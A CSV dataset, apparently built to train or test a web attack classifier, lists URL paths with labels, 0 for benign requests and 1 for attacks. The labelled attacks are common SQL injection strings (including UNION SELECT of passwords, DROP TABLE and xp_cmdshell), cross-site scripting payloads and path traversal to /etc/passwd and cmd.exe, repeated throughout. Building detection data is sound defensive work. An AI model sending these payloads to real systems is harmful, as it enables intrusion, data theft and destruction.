payload,label
/contact?user=urmit102,0
/api/users?user=urmit247,0
/about?page=22,0
/about?page=2685,0
/index.html?sort=asc757,0
/dashboard?search=onload=prompt(1),1
"/products/item?search="" OR 1=1 --",1
/products/item?category=tech285,0
/index.html?category=tech159,0
/contact?sort=asc597,0
/api/users?id=1767,0
/dashboard?id=1458,0
/api/users?id=123,0
/index.html?category=tech907,0
/products/item?page=2829,0
/login?sort=asc886,0
/api/users,0
/products/item?sort=asc741,0
/contact,0
/contact?page=2233,0
/login,0
/checkout,0
/products/item?category=tech929,0
/about?user=urmit149,0
/checkout?page=2553,0
/index.html?sort=asc378,0
/<script>alert(document.cookie)</script>,1
/about?category=tech640,0
/' OR '1'='1,1
/login?id=1642,0
/index.html?sort=asc587,0
/login?search=admin' --,1
/login?page=2368,0
/login?search=onload=prompt(1),1
/dashboard,0
/products/item?id=1267,0
/index.html?category=tech707,0
/login?page=2166,0
/products/item,0
/login?user=urmit632,0
/products/item?sort=asc127,0
/contact?id=1298,0
/products/item,0
/login?id=1548,0
/products/item?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit326,0
/contact?sort=asc277,0
/login?sort=asc492,0
/' OR '1'='1,1
/products/item?id=1141,0
/index.html?sort=asc251,0
/about?user=urmit47,0
/contact,0
/<script>alert(document.cookie)</script>,1
/products/item?id=1184,0
/about,0
/products/item?search=?id=1; DROP TABLE users,1
/checkout?user=urmit183,0
/contact?user=urmit954,0
/contact?category=tech673,0
/about?user=urmit819,0
/login?page=2297,0
/about?id=1910,0
/api/users?category=tech993,0
/about?id=1179,0
/api/users?category=tech563,0
/products/item,0
/dashboard?sort=asc740,0
/index.html?id=1504,0
/dashboard?user=urmit532,0
/products/item?user=urmit831,0
/contact?user=urmit590,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech751,0
/dashboard?page=2200,0
/about,0
/products/item?user=urmit498,0
/products/item?id=1391,0
/index.html?sort=asc164,0
/index.html?category=tech598,0
/dashboard?sort=asc811,0
/index.html?sort=asc305,0
/checkout?id=1790,0
/about?page=2592,0
/login,0
/dashboard,0
/contact?page=239,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?page=2364,0
/index.html,0
/contact?search=javascript:eval('var a=1'),1
/login?category=tech619,0
/checkout,0
/checkout,0
/api/users?category=tech542,0
/contact?user=urmit197,0
/about?sort=asc32,0
/dashboard?page=2293,0
/about?sort=asc655,0
/login?page=2966,0
/products/item?category=tech529,0
/about?category=tech925,0
/about,0
/login?user=urmit881,0
/contact?page=2549,0
/login,0
/about?sort=asc123,0
/api/users?page=2139,0
/index.html?page=276,0
/contact?page=2445,0
/login?category=tech946,0
/checkout?id=1944,0
/index.html?user=urmit253,0
/api/users?sort=asc686,0
/login?user=urmit619,0
/about?page=2549,0
/checkout?id=1979,0
/dashboard?page=2769,0
/about?category=tech332,0
/contact,0
/contact?user=urmit152,0
/api/users,0
/checkout?id=1332,0
/checkout?user=urmit666,0
/checkout?user=urmit379,0
/checkout,0
/login?search=../../../windows/system32/cmd.exe,1
/'; EXEC xp_cmdshell('dir');--,1
/login?id=1462,0
"/index.html?search=UNION SELECT username, password FROM users",1
/dashboard,0
/contact?category=tech765,0
/api/users?category=tech517,0
/products/item?page=2162,0
/about,0
/admin' --,1
/../../../../etc/passwd,1
/onload=prompt(1),1
/products/item?user=urmit194,0
/about?sort=asc713,0
/index.html?id=1440,0
/dashboard?user=urmit591,0
/api/users?page=2957,0
/about,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?page=2556,0
"/UNION SELECT username, password FROM users",1
/dashboard?user=urmit840,0
/products/item?id=1194,0
/api/users?user=urmit316,0
/about?category=tech503,0
/dashboard?sort=asc834,0
/api/users,0
/api/users?user=urmit966,0
/about?search=../../../windows/system32/cmd.exe,1
/products/item?id=1251,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?user=urmit845,0
/dashboard?sort=asc499,0
/index.html?category=tech14,0
/checkout?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?sort=asc688,0
/dashboard?sort=asc269,0
/checkout?user=urmit312,0
/checkout?sort=asc800,0
/contact?page=2901,0
/login?id=1473,0
/dashboard,0
/contact?page=2193,0
/about,0
/checkout,0
/contact?sort=asc686,0
/api/users?category=tech295,0
/<script>alert(document.cookie)</script>,1
/dashboard?category=tech925,0
/<script>alert(document.cookie)</script>,1
/about?id=195,0
/products/item,0
"/api/users?search="" OR 1=1 --",1
/about?sort=asc340,0
/login?id=1486,0
/contact,0
/contact?search=javascript:eval('var a=1'),1
/../../../windows/system32/cmd.exe,1
/checkout,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech165,0
/api/users,0
/checkout?category=tech591,0
/about?category=tech496,0
/index.html,0
"/login?search="" OR 1=1 --",1
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/contact?search=onload=prompt(1),1
/index.html?user=urmit282,0
/index.html?category=tech964,0
/checkout?user=urmit519,0
/contact?search=javascript:eval('var a=1'),1
/index.html?sort=asc156,0
/index.html?user=urmit331,0
/login,0
/dashboard?id=1189,0
/contact?sort=asc379,0
"/products/item?search="" OR 1=1 --",1
/contact?search=../../../windows/system32/cmd.exe,1
/about?sort=asc423,0
/about?page=2577,0
/checkout?category=tech964,0
/index.html?page=2300,0
/api/users?id=1953,0
/products/item?user=urmit857,0
/contact?sort=asc771,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?sort=asc850,0
/products/item?category=tech642,0
/../../../../etc/passwd,1
/dashboard?id=1639,0
/' OR '1'='1,1
/contact?user=urmit123,0
/login?search=admin' --,1
/login?category=tech668,0
/index.html,0
/index.html?id=1978,0
/dashboard?page=2558,0
/javascript:eval('var a=1'),1
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?page=2694,0
/contact?category=tech871,0
/javascript:eval('var a=1'),1
/login?category=tech332,0
"/"" OR 1=1 --",1
/products/item?search=onload=prompt(1),1
/about?category=tech405,0
/checkout?user=urmit272,0
"/products/item?search=UNION SELECT username, password FROM users",1
/index.html,0
/contact?sort=asc78,0
/products/item?category=tech275,0
/index.html?user=urmit100,0
/index.html?id=1733,0
/index.html?sort=asc119,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/checkout?page=2653,0
/products/item?id=1746,0
/checkout?search=?id=1; DROP TABLE users,1
/api/users?sort=asc517,0
/login?sort=asc558,0
/about?sort=asc227,0
/about?category=tech119,0
/admin' --,1
/api/users?sort=asc916,0
/api/users?user=urmit439,0
/login?page=2453,0
/index.html?sort=asc558,0
/checkout,0
/api/users?category=tech261,0
/dashboard?search=../../../../etc/passwd,1
/login?id=1531,0
/index.html?user=urmit955,0
/contact?id=1676,0
/checkout,0
/about?sort=asc718,0
/api/users?id=113,0
/checkout,0
/about?user=urmit985,0
/about?user=urmit953,0
/checkout?category=tech791,0
/login?id=197,0
/dashboard?page=2400,0
/index.html?sort=asc363,0
/index.html,0
/products/item?page=2698,0
/api/users?page=2466,0
/products/item?sort=asc183,0
/about?sort=asc681,0
/contact?search=<script>alert(document.cookie)</script>,1
/products/item?user=urmit989,0
/about?sort=asc141,0
/products/item?page=2735,0
/checkout?sort=asc544,0
/dashboard?search=?id=1; DROP TABLE users,1
/dashboard?user=urmit531,0
/login,0
/login,0
/about?sort=asc918,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?sort=asc732,0
/products/item?user=urmit74,0
/checkout?id=1306,0
/about?user=urmit573,0
/contact?page=2472,0
/products/item,0
/login,0
/dashboard?page=2613,0
/login?search=../../../windows/system32/cmd.exe,1
/about?page=2544,0
/dashboard?sort=asc833,0
/index.html?id=1595,0
/products/item?id=1556,0
/about?id=1956,0
/api/users?page=2501,0
/about,0
/about,0
/index.html?user=urmit58,0
/about?id=1583,0
/login?category=tech954,0
/about,0
/products/item?sort=asc226,0
/about?search=javascript:eval('var a=1'),1
/contact?search='; EXEC xp_cmdshell('dir');--,1
/index.html?page=2841,0
/api/users?category=tech355,0
/products/item?id=171,0
/products/item?sort=asc385,0
/admin' --,1
/products/item?id=1252,0
/login?page=2101,0
/api/users?sort=asc458,0
/about?search='; EXEC xp_cmdshell('dir');--,1
/checkout,0
/index.html?id=1530,0
/index.html?sort=asc603,0
/login?category=tech687,0
"/index.html?search=UNION SELECT username, password FROM users",1
/contact?sort=asc132,0
/products/item?user=urmit835,0
/index.html,0
/products/item?user=urmit93,0
/products/item?id=1861,0
/admin' --,1
/index.html?category=tech706,0
/index.html?id=1597,0
/?id=1; DROP TABLE users,1
/products/item,0
/api/users?sort=asc869,0
/login?id=1909,0
/dashboard?sort=asc806,0
/checkout,0
/index.html?page=2989,0
/about?search=../../../windows/system32/cmd.exe,1
/'; EXEC xp_cmdshell('dir');--,1
/contact?sort=asc682,0
/about?category=tech936,0
/index.html?page=2470,0
/checkout?user=urmit397,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=1882,0
/index.html?category=tech306,0
/login?sort=asc508,0
/dashboard?user=urmit20,0
/api/users?id=1319,0
/index.html?user=urmit561,0
/contact,0
/index.html?sort=asc671,0
/login?category=tech702,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?search=../../../windows/system32/cmd.exe,1
/contact?sort=asc656,0
/dashboard?search=?id=1; DROP TABLE users,1
/products/item?sort=asc129,0
/contact?category=tech623,0
/../../../windows/system32/cmd.exe,1
/api/users?category=tech358,0
/login?user=urmit790,0
/contact?search=onload=prompt(1),1
/api/users?search=<script>alert(document.cookie)</script>,1
/api/users?sort=asc465,0
/about?page=2335,0
/checkout?user=urmit80,0
/products/item?sort=asc27,0
/login?sort=asc955,0
"/checkout?search=UNION SELECT username, password FROM users",1
/about?category=tech627,0
/products/item?sort=asc411,0
/index.html?page=2173,0
/' OR '1'='1,1
/login?page=2817,0
/api/users?id=1326,0
/login,0
/products/item?id=1201,0
/products/item?id=1324,0
/contact?page=2834,0
/login?id=1882,0
/login?id=1862,0
/dashboard?id=1583,0
/login?page=2535,0
/api/users,0
/about,0
/about?category=tech960,0
/api/users?page=2412,0
/contact,0
/dashboard?sort=asc738,0
/checkout?user=urmit488,0
/dashboard?sort=asc883,0
/api/users?user=urmit140,0
/about?id=1343,0
/contact?user=urmit517,0
/index.html?user=urmit419,0
/about?search=admin' --,1
/../../../windows/system32/cmd.exe,1
/checkout?sort=asc264,0
/dashboard?page=2188,0
/dashboard?category=tech218,0
/contact?id=1433,0
/login?search=onload=prompt(1),1
/admin' --,1
/index.html?id=1222,0
/index.html?id=1161,0
/dashboard?id=1457,0
/about,0
/?id=1; DROP TABLE users,1
/about?id=184,0
/contact?page=2444,0
/about?user=urmit383,0
/<script>alert(document.cookie)</script>,1
/products/item?page=2156,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?search=javascript:eval('var a=1'),1
/login?category=tech386,0
/api/users?page=2594,0
/contact?category=tech868,0
/products/item?id=1321,0
/dashboard?search=admin' --,1
/../../../../etc/passwd,1
/index.html?category=tech806,0
/products/item?category=tech680,0
/dashboard?search=javascript:eval('var a=1'),1
/checkout?page=2279,0
/api/users,0
/about?category=tech543,0
/<script>alert(document.cookie)</script>,1
/dashboard?page=2940,0
/api/users?sort=asc640,0
/../../../../etc/passwd,1
/contact?category=tech676,0
/dashboard?page=2517,0
/index.html?search=../../../../etc/passwd,1
/login?id=1976,0
/api/users?sort=asc92,0
/products/item?category=tech678,0
/login?search=../../../windows/system32/cmd.exe,1
/checkout?sort=asc288,0
/checkout?id=1873,0
/api/users?id=1577,0
/login?id=1387,0
/login?page=26,0
/checkout,0
/about?sort=asc259,0
/<script>alert(document.cookie)</script>,1
/login?category=tech398,0
/products/item?page=2460,0
/index.html,0
/api/users?category=tech357,0
/api/users?user=urmit684,0
/login?sort=asc764,0
/dashboard?id=1333,0
/contact?page=289,0
/products/item?id=136,0
/products/item?id=1917,0
/contact?user=urmit828,0
/products/item?page=2432,0
/contact?sort=asc853,0
/api/users?page=2269,0
/login?sort=asc244,0
"/products/item?search=UNION SELECT username, password FROM users",1
/products/item?user=urmit615,0
/contact?sort=asc374,0
/index.html?category=tech369,0
/checkout?category=tech682,0
/contact?id=1401,0
/../../../windows/system32/cmd.exe,1
/index.html?user=urmit788,0
/products/item?search=../../../../etc/passwd,1
/index.html?search=<script>alert(document.cookie)</script>,1
/checkout?sort=asc468,0
/api/users?category=tech191,0
/contact,0
/index.html?sort=asc964,0
/checkout,0
/contact?page=2249,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?category=tech67,0
/api/users?category=tech465,0
/checkout?page=2316,0
/contact,0
/<script>alert(document.cookie)</script>,1
/api/users?id=1321,0
/about?page=2318,0
/products/item?user=urmit829,0
/'; EXEC xp_cmdshell('dir');--,1
/checkout?category=tech173,0
/contact?id=132,0
/index.html?category=tech939,0
/about?sort=asc548,0
/api/users,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?page=2195,0
/index.html,0
/index.html,0
/index.html?search=../../../../etc/passwd,1
/api/users?user=urmit331,0
/login,0
/checkout,0
/dashboard?user=urmit902,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
"/"" OR 1=1 --",1
/products/item?id=1925,0
/login?id=1605,0
/login,0
/about,0
/api/users?sort=asc623,0
/javascript:eval('var a=1'),1
/checkout?category=tech388,0
/login?id=1587,0
/dashboard?category=tech237,0
/about?page=2639,0
/javascript:eval('var a=1'),1
/admin' --,1
/index.html?page=2591,0
/api/users?page=2643,0
/dashboard?id=1811,0
/about?user=urmit753,0
/contact?search=../../../windows/system32/cmd.exe,1
/products/item?user=urmit119,0
/index.html?id=1354,0
/products/item?user=urmit999,0
/products/item?id=1486,0
/api/users?user=urmit17,0
/dashboard?user=urmit321,0
/about?id=1250,0
/checkout?category=tech979,0
/index.html,0
/checkout?category=tech567,0
/index.html?category=tech576,0
/contact?user=urmit902,0
/checkout,0
/<script>alert(document.cookie)</script>,1
/../../../../etc/passwd,1
/api/users?search=?id=1; DROP TABLE users,1
/api/users?id=192,0
"/api/users?search="" OR 1=1 --",1
/api/users?sort=asc728,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?page=2184,0
/contact?user=urmit735,0
/api/users?page=2248,0
/admin' --,1
/admin' --,1
/contact?category=tech94,0
/javascript:eval('var a=1'),1
/index.html?search=' OR '1'='1,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?user=urmit661,0
/dashboard?id=1757,0
"/index.html?search="" OR 1=1 --",1
/checkout?category=tech305,0
/checkout?search=admin' --,1
/dashboard?page=2372,0
/index.html?user=urmit534,0
/index.html?sort=asc419,0
"/index.html?search=UNION SELECT username, password FROM users",1
/dashboard,0
/contact?user=urmit856,0
/about?category=tech38,0
/index.html?id=1367,0
/products/item?sort=asc931,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech741,0
"/contact?search=UNION SELECT username, password FROM users",1
/api/users?search=javascript:eval('var a=1'),1
/index.html?id=1471,0
/login?id=1599,0
/login?category=tech196,0
/checkout?category=tech258,0
/contact?category=tech763,0
/api/users,0
/about?sort=asc295,0
/about?category=tech954,0
/about,0
/contact?page=218,0
/contact?user=urmit672,0
/login?id=1577,0
/dashboard?user=urmit18,0
/index.html,0
"/"" OR 1=1 --",1
/products/item?category=tech646,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout,0
/javascript:eval('var a=1'),1
/about?category=tech552,0
/about?id=1907,0
/index.html,0
/index.html?id=1646,0
/contact?id=1401,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?category=tech642,0
/index.html,0
/about?page=2209,0
/index.html?sort=asc195,0
/checkout?sort=asc619,0
/products/item?category=tech922,0
/index.html?page=217,0
/api/users?search=onload=prompt(1),1
/login?category=tech403,0
"/api/users?search=UNION SELECT username, password FROM users",1
/login?search=' OR '1'='1,1
/products/item?id=1837,0
/products/item,0
"/"" OR 1=1 --",1
/products/item?search=onload=prompt(1),1
/admin' --,1
/../../../windows/system32/cmd.exe,1
/index.html?category=tech86,0
/dashboard?category=tech876,0
/about?category=tech305,0
/checkout?page=2186,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?category=tech135,0
/login?id=1495,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact,0
/checkout?category=tech601,0
/about,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?category=tech808,0
/contact?id=1299,0
/login?category=tech669,0
/products/item?id=1664,0
/api/users,0
/login,0
/contact?category=tech179,0
/<script>alert(document.cookie)</script>,1
/checkout,0
/contact?user=urmit111,0
/api/users?page=2391,0
/login?id=1335,0
/login?user=urmit710,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item,0
/about?page=2283,0
/login?id=1489,0
/dashboard?id=1195,0
/about?user=urmit646,0
/checkout?user=urmit454,0
/contact?user=urmit37,0
/checkout?user=urmit442,0
/api/users?id=1969,0
/dashboard?category=tech649,0
/api/users?id=1621,0
/dashboard?id=184,0
/dashboard?id=1867,0
/admin' --,1
/products/item?page=2736,0
/index.html?id=1292,0
/index.html?id=1607,0
/login?page=2604,0
/login?page=2249,0
/products/item,0
/../../../windows/system32/cmd.exe,1
/checkout?category=tech911,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?user=urmit822,0
/dashboard?id=1525,0
"/contact?search="" OR 1=1 --",1
/login?category=tech737,0
/about?user=urmit218,0
/products/item,0
/api/users,0
/'; EXEC xp_cmdshell('dir');--,1
/dashboard,0
"/dashboard?search="" OR 1=1 --",1
/about?page=2759,0
/about?page=2543,0
/?id=1; DROP TABLE users,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?id=154,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/checkout?user=urmit859,0
/login?category=tech427,0
/about?page=2342,0
/login?id=1963,0
/../../../windows/system32/cmd.exe,1
/dashboard?page=2786,0
/login?page=2660,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/contact?page=2333,0
/products/item,0
/<script>alert(document.cookie)</script>,1
/index.html?category=tech666,0
/index.html?user=urmit427,0
/javascript:eval('var a=1'),1
/login?page=2617,0
/api/users?page=2664,0
/../../../windows/system32/cmd.exe,1
/dashboard?category=tech564,0
"/UNION SELECT username, password FROM users",1
/index.html?id=1622,0
/checkout?sort=asc709,0
/login?id=1194,0
/products/item?search=../../../windows/system32/cmd.exe,1
/products/item?category=tech191,0
/about?category=tech135,0
/contact?user=urmit608,0
/checkout?category=tech108,0
/index.html?category=tech219,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?sort=asc808,0
/products/item,0
/index.html?user=urmit696,0
/checkout?category=tech665,0
/about?id=1977,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item,0
/products/item?page=2544,0
/products/item?sort=asc957,0
/dashboard?page=2155,0
/login?page=2789,0
/api/users?sort=asc881,0
/checkout?page=2454,0
/about?sort=asc810,0
/api/users?category=tech589,0
/checkout,0
/checkout?id=1389,0
/api/users?user=urmit409,0
/index.html?id=1236,0
/' OR '1'='1,1
/index.html?sort=asc189,0
/about?user=urmit548,0
/admin' --,1
/api/users?id=1214,0
/checkout?id=1790,0
/about?user=urmit765,0
/checkout?category=tech921,0
/products/item,0
/dashboard?sort=asc861,0
/checkout?user=urmit438,0
/login?user=urmit682,0
/api/users?user=urmit831,0
/index.html?category=tech23,0
/?id=1; DROP TABLE users,1
/login?category=tech395,0
/../../../../etc/passwd,1
/login?id=1361,0
/about?search=admin' --,1
/login,0
/products/item?search=' OR '1'='1,1
/checkout,0
/contact?page=2144,0
/dashboard?page=2970,0
